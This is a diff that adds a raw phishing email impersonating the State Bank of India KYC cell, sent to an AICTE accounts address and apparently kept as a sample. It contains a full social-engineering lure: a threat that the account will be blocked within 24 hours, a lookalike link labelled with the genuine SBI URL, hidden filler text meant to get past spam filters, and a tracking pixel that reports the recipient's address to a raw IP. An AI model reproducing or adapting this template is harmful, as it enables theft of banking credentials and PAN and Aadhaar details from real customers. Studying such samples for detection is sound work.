@@ -1,0 +1,68 @@
+Return-Path: <alerts@sbi-kyc-verify.top>
+Delivered-To: accounts@aicte-india.org
+Received: from mx.google.com (mx.google.com. [209.85.220.41])
+        by mail.aicte-india.org with ESMTPS id k7si22014831pfb.128.2026.09.10.04.12.55
+        for <accounts@aicte-india.org>
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Wed, 10 Sep 2026 04:12:55 -0700 (PDT)
+Received: from srv-mail01.fasthost.ltd (unknown [5.188.206.14])
+        by mx.google.com with ESMTP id 9a1b2c3d
+        for <accounts@aicte-india.org>;
+        Wed, 10 Sep 2026 04:12:53 -0700 (PDT)
+Received: from [192.168.1.105] (localhost [127.0.0.1])
+        by srv-mail01.fasthost.ltd (Postfix) with ESMTPA id 4F3A2B1C
+        Wed, 10 Sep 2026 14:12:50 +0300 (MSK)
+Received-SPF: fail (google.com: domain of alerts@sbi-kyc-verify.top does not designate 5.188.206.14 as permitted sender) client-ip=5.188.206.14;
+Authentication-Results: mx.google.com;
+       spf=fail (google.com: domain of alerts@sbi-kyc-verify.top does not designate 5.188.206.14 as permitted sender) smtp.mailfrom=alerts@sbi-kyc-verify.top;
+       dkim=none;
+       dmarc=fail (p=NONE sp=NONE dis=NONE) header.from=sbi-kyc-verify.top
+From: "State Bank of India - KYC Cell" <kyc.alerts@sbi-kyc-verify.top>
+Reply-To: sbi.kyc.helpdesk2026@gmail.com
+To: accounts@aicte-india.org
+Subject: URGENT: Your SBI account will be blocked in 24 hours - Complete KYC now
+Date: Wed, 10 Sep 2026 16:42:48 +0530
+Message-ID: <20260910111248.4F3A2B1C@srv-mail01.fasthost.ltd>
+X-Mailer: PHPMailer 6.8.0 (https://github.com/PHPMailer/PHPMailer)
+X-PHP-Originating-Script: 1001:sendkyc.php
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="----=_Part_1"
+
+------=_Part_1
+Content-Type: text/plain; charset="UTF-8"
+
+Dear Customer,
+
+As per RBI guidelines, your State Bank of India account has been temporarily
+restricted because your KYC documents have not been updated.
+
+To avoid permanent blocking of your account and debit card within 24 hours,
+kindly update your PAN card and Aadhaar details immediately using the secure
+link below:
+
+https://onlinesbi.sbi.kyc-update-portal.top/secure/login?ref=INB884213
+
+Failure to update KYC before midnight today will result in suspension of
+your net banking, UPI and YONO services.
+
+Do not share this email with anyone.
+
+Warm Regards,
+KYC Verification Team
+State Bank of India
+
+------=_Part_1
+Content-Type: text/html; charset="UTF-8"
+
+<html><body style="font-family:Arial">
+<img src="https://sbi-kyc-verify.top/img/sbi-logo.png" width="180">
+<p>Dear Customer,</p>
+<p>As per RBI guidelines, your <b>State Bank of India</b> account has been temporarily restricted because your KYC documents have not been updated.</p>
+<p>To avoid <b>permanent blocking</b> of your account and debit card within <b>24 hours</b>, kindly update your PAN card and Aadhaar details immediately:</p>
+<p><a href="https://onlinesbi.sbi.kyc-update-portal.top/secure/login?ref=INB884213" style="background:#2d3e8f;color:#fff;padding:10px 20px">https://retail.onlinesbi.sbi/retail/login.htm</a></p>
+<p>Failure to update KYC before midnight today will result in suspension of your net banking, UPI and YONO services.</p>
+<p style="display:none">quarterly newsletter archive garden recipe volunteer library schedule</p>
+<img src="http://5.188.206.14/track.php?id=accounts@aicte-india.org" width="1" height="1">
+<p>Warm Regards,<br>KYC Verification Team<br>State Bank of India</p>
+</body></html>
+------=_Part_1--
